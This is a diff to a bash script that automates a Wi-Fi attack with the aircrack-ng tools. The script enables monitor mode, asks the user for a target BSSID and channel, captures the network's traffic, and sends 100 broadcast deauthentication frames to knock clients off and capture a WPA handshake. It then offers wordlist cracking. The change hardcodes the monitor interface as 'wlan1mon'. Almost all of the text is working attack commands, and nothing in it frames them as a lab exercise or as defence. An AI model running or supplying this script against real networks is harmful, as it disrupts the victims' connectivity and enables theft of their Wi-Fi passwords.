@@ -8,19 +8,20 @@ echo Enter Interface Name:
 read interface
 echo Enter Monitor mode interface name:
 read mon
+echo "We will now use $mon"
+sleep 2
 airmon-ng start $interface
 airmon-ng check kill
-echo Enter Monitor Mode Interface:
-read mon
-xterm -hold -e "airodump-ng $mon"
+sleep 1
+xterm -hold -e "airodump-ng wlan1mon"
 echo Enter BSSID Of Target
 read bid
 echo $bid
 echo Enter Channel Of Target
 read chnl
 client=FF:FF:FF:FF:FF:FF
-xterm -hold -e "airodump-ng --ig -w cap -c $chnl --bssid $bid $mon"
-xterm -hold -e "aireplay-ng --ig --deauth 100 -a $bid -c $client $mon"
+xterm -hold -e "airodump-ng --ig -w cap -c $chnl --bssid $bid wlan1mon"
+xterm -hold -e "aireplay-ng --ig --deauth 100 -a $bid -c $client wlan1mon"
 sleep 4
 clear
 echo "Do you want to use a wordlist (y/n)"
